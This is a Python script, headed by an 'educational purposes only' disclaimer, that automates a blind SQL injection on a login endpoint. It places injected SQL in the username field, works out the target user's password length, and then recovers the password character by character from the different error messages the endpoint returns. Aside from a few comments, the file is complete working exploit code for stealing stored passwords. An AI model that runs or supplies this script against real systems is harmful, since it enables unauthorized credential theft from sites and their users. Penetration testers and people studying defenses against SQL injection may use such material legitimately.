# DISCLAIMER:
# This script is provided for educational purposes and ethical hacking/penetration testing only.
# Unauthorized use of this script on any system you do not own or have explicit permission to test is illegal.
# The author do not assume any responsibility for misuse of this tool.
import requests
'''#Possible enhancements:
1- Make it accept more than just numbers and letters ex: $,@ etc..
2- Show user errors in a better way
3- Refactor code for repeated loops into function 
'''
# post a request and return the status code
def post_request(URL, PARAMS):
    try:
        r = requests.post(url = URL, json = PARAMS)
        return r.status_code, r.json()
    except:
        return 500, {"error": "ERROR"}
def check_wrong_sql(status)->bool:
    if isinstance(status, int) and status >= 500:
        print ("YOUR SQL STATEMENT SYNTAX IS WRONG!!!!!!!!!!!!!!!!!\n!!!!!!!!!!!!!!!!!\n!!!!!!!!!!!!!!!!!!!!!!")
        return True
    return False
#function returns what char type is it a number? capital letter? or small letter?
def char_type(URL, known_username, valid_table_name, char_index)->str:
    start = [48, 65, 97] #ASCII start '0' OR 'A' OR 'a'
    end = [57, 90,122]   #ASCII end:  '9' OR 'Z' OR 'Z'
    result_option= ["number","capital_letter","small_letter"]
    for i in range(3):
        sql_inject_statement = f"\' OR ASCII(SUBSTRING((SELECT PASSWORD FROM {valid_table_name} WHERE USERNAME = \"{known_username}\"), {char_index}, 1)) BETWEEN {start[i]} AND {end[i]};"
        PARAMS = {"username": sql_inject_statement, "password": ""}
        status, response = post_request(URL, PARAMS)
        if check_wrong_sql(status):
            print("PLEASE CHANGE YOUR SQL STATEMENT")
            return "error"
        #If invalid password this means we got the right char based on our query
        if response["error"] == "Invalid password":
            #sucsess! so return what is the type of the char
            return result_option[i]

def main():
    ''' # Steps to get the password we want
    #Main idea: using SQL statements we will force the website to show UserNotFound until we got InvalidPassword
    in this case we know that the char match and we will add it to the array
    #NOTE: This program only valid if the website shows either "Invalid username" or "Invalid password"
    1- check the length of the password
    2- start with first char of the password and end loop when reaching password length extracted from (1)
    3- we are interested in knowing is the char a number (0-9)?, capital letter(A-Z)? or small letter?(a-z)
    for simplicity we will ignore symbols
    4- If it matches one of the three options, we will loop from first-to-last possible char from that range
    5- if we got response InvalidPassword, then we got the char that match, so we add it to array and
    move to next iteration
    '''
    # define api-endpoint
    URL = input("Enter your URL: ")
    PARAMS = {}
    valid_username = input("Enter valid username: ")  #enter any username that is for sure exist in the table
    valid_table_name = input("Enter valid table_name: ") #enter here the table name that you assume or know
    password_len = 0
    password_extract = "" #password for valid_username will be extracted, saved here and printed later
    # send here the request if no user found continue, if Username not found we got password len
    for i in range(25):#assume password length is less than 25
        sql_inject_statement = f"\' OR LENGTH ((SELECT PASSWORD FROM {valid_table_name} WHERE USERNAME = \'{valid_username}\')) > {i};"
        PARAMS = {"username": sql_inject_statement, "password":""}
        status, response = post_request(URL, PARAMS)
        #internal error indicates syntax error in SQL
        if status >= 500:
            return "YOUR SQL STATEMENT SYNTAX IS WRONG!"
        if response["error"] == "Username not found":
            password_len = i
            break

    # extract password char by char logic
    for i in range(password_len):
        char_type_result = char_type(URL, valid_username, valid_table_name, i+1)
        #set the start and end of the symbols we want to check based on the char_type_result
        if char_type_result == "number":
            start_loop = '0'
            end_loop = '9'
        elif char_type_result == "capital_letter":
            start_loop = 'A'
            end_loop = 'Z'
        elif char_type_result == "small_letter":
            start_loop = 'a'
            end_loop = 'z'
        else:
            print("Char type cant be determined, check char_type function")
            return
        #loop through symbols example from A to Z, but convert them to there ASCII decimal equevilent value
        for index in range(ord(start_loop), ord(end_loop) + 1):
            sql_inject_statement = f"\' OR ASCII(SUBSTRING((SELECT PASSWORD FROM {valid_table_name} WHERE USERNAME = \"{valid_username}\"), {i + 1}, 1)) = \'{index}\';"
            PARAMS = {"username": sql_inject_statement, "password": ""}
            status, response = post_request(URL, PARAMS)
            if not check_wrong_sql(status) and response.get("error") == "Invalid password":
                password_extract += chr(index)
                break
    print(f"PASSWORD for {valid_username} is: -----------------------> ", password_extract)
if __name__ == "__main__":
    main()